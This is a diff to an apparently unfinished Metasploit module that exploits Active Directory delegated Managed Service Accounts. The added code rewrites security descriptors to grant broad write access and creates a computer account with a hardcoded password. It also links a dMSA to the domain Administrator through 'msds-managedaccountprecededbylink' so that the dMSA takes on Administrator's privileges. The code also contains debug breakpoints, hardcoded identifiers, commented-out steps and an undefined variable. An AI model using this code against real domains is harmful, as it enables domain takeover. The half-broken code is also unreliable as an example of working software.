@@ -160,8 +160,8 @@ class MetasploitModule < Msf::Auxiliary
       'msds-supportedencryptiontypes' => ["28"],
       'msds-managedpasswordid' => ["\x01\x00\x00\x00KDSK\x02\x00\x00\x00k\x01\x00\x00\v\x00\x00\x00\a\x00\x00\x00\xC7\x14\x863y\xD1WQ\x8C\x9A4\xCC\xD6;\xF8x\x00\x00\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00m\x00s\x00f\x00.\x00l\x00o\x00c\x00a\x00l\x00\x00\x00m\x00s\x00f\x00.\x00l\x00o\x00c\x00a\x00l\x00\x00\x00"],
       'msds-managedpasswordinterval' => ["30"],
-      'msds-delegatedmsastate' => ["2"],
-      'msds-managedaccountprecededbylink'=> ["CN=Administrator,CN=Users,DC=msf,DC=local"],
+      'msds-delegatedmsastate' => ["0"],
+      #  'msds-managedaccountprecededbylink'=> ["CN=Administrator,CN=Users,DC=msf,DC=local"],
       'name' => [account_name]
     }
 
@@ -186,6 +186,85 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Created dmsa #{account_name}")
     true
 
+  end
+
+  def ms_security_descriptor_control(flags)
+    control_values = [flags].map(&:to_ber).to_ber_sequence.to_s.to_ber
+    [LDAP_SERVER_SD_FLAGS_OID.to_ber, control_values].to_ber_sequence
+  end
+
+  def build_ace(sid)
+    Rex::Proto::MsDtyp::MsDtypAce.new({
+                                        header: {
+                                          ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
+                                        },
+                                        body: {
+                                          access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,
+                                          sid: sid
+                                        }
+                                      })
+  end
+
+  def grant_write_all_properties(dmsa_dn, user_sid)
+    print_status("Granting 'Write all properties' permission for dMSA object: #{dmsa_dn}")
+
+    # Retrieve the current security descriptor
+    attributes = ['nTSecurityDescriptor']
+    entry = @ldap.search(base: dmsa_dn, attributes: attributes, controls: [ms_security_descriptor_control(DACL_SECURITY_INFORMATION)])&.first
+    unless entry
+      fail_with(Failure::NotFound, "Failed to retrieve security descriptor for #{dmsa_dn}")
+    end
+
+    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(entry['nTSecurityDescriptor'].first)
+    unless security_descriptor.dacl
+      fail_with(Failure::BadConfig, "No DACL found on the security descriptor for #{dmsa_dn}")
+    end
+
+    # Add ACE for "Write all properties"
+    ace = Rex::Proto::MsDtyp::MsDtypAce.new({
+      header: {
+        ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
+      },
+      body: {
+        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask.new({ protocol: 0x20 }), # Write all properties
+        sid: Rex::Proto::MsDtyp::MsDtypSid.new(user_sid)
+      }
+    })
+
+    your_sid = "S-1-5-21-549140833-564715882-1385822508-1103"
+    puts "Effective ACEs with WRITE_DAC for #{your_sid}:"
+
+    security_descriptor.dacl.aces.each do |ace|
+        require 'pry-byebug'; binding.pry if ace.body.sid == your_sid && (ace[:protocol] & 0x10 != 0)
+    end
+
+    security_descriptor.dacl[:aces] << ace
+    print_status("Added ACE for 'Write all properties' with access mask 0x20")
+
+    # Update the security descriptor on the LDAP server
+    unless @ldap.modify(dn: dmsa_dn, operations: [[:replace, 'nTSecurityDescriptor', security_descriptor.to_s]])
+      fail_with(Failure::Unknown, "Failed to update security descriptor for #{dmsa_dn}")
+    end
+
+    print_good("Successfully granted 'Write all properties' permission for dMSA object: #{dmsa_dn}")
+  end
+
+  def set_dmsa_attributes(dn, delegated_state, preceded_by_link)
+    print_status("Setting attributes for dMSA object: #{dn}")
+
+    # Define the attributes to update
+    operations = [
+      [:replace, 'msds-delegatedmsastate', [delegated_state]],
+      [:replace, 'msds-managedaccountprecededbylink', [preceded_by_link]]
+    ]
+
+    # Perform the LDAP modify operation
+    unless @ldap.modify(dn: dn, operations: operations)
+      res = @ldap.get_operation_result
+      fail_with(Failure::Unknown, "Failed to update attributes for #{dn}: #{res.message} - #{res.error_message}")
+    end
+
+    print_good("Successfully updated attributes for dMSA object: #{dn}")
   end
 
   def query_account(account_name)
@@ -220,6 +299,41 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
+  end
+
+  def create_computer_account(computer_account, writeable_dn)
+    dn  = "CN=#{computer_account},#{writeable_dn}"
+    print_status("Attempting to dmsa account cn: #{computer_account}, dn: #{dn}")
+    computer_attributes = {
+      'objectclass' => ["top", "person", "organizationalPerson", "user", "computer"],
+      'cn' => [computer_account],
+      'useraccountcontrol' => ["4096"],
+      'samaccountname' => [computer_account + '$'],
+      'dnshostname' => ["dontcare.com"],
+      'userPassword' =>["N0tpassword!"],
+      'name' => [computer_account]
+    }
+
+    unless @ldap.add(dn: dn, attributes: computer_attributes)
+
+      res = @ldap.get_operation_result
+
+      case res.code
+      when Net::LDAP::ResultCodeInsufficientAccessRights
+        print_error("Insufficient access to create dMSA seed")
+      when Net::LDAP::ResultCodeEntryAlreadyExists
+        print_error("Seed object #{account_name} already exists")
+      when Net::LDAP::ResultCodeConstraintViolation
+        print_error("Constraint violation: #{res.error_message}")
+      else
+        print_error("#{res.message}: #{res.error_message}")
+      end
+
+      return false
+    end
+
+    print_good("Created dmsa #{computer_account}")
+    true
   end
 
   def run
@@ -263,9 +377,18 @@ class MetasploitModule < Msf::Auxiliary
 
       fail_with(Failure::NoTarget, "There are no Organization Units we can write to, the exploit can not continue") if ous.empty?
       account_name =  Faker::Internet.username(separators: '')
+      #computer_account = Faker::Internet.username(separators: '')
+      #computer_account = "server1"
+       account_name =  "attackie_boi"
       print_good("Found #{ous.length} OUs we can write to")
-      create_dmsa(account_name, writeable_dn)
-      query_account(account_name)
+      #create_computer_account(computer_account, writeable_dn)
+      #generate_
+      #create_dmsa(account_name, writeable_dn)
+      require'pry-byebug';binding.pry
+      query_account("attackie_boi")
+      # You already have Write All Properties :hmmm:
+      #grant_write_all_properties("CN=#{account_name},#{writeable_dn}", Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first))
+      set_dmsa_attributes("CN=#{account_name},#{writeable_dn}","2", "CN=Administrator,CN=Users,DC=msf,DC=local")
     end
   end
 end
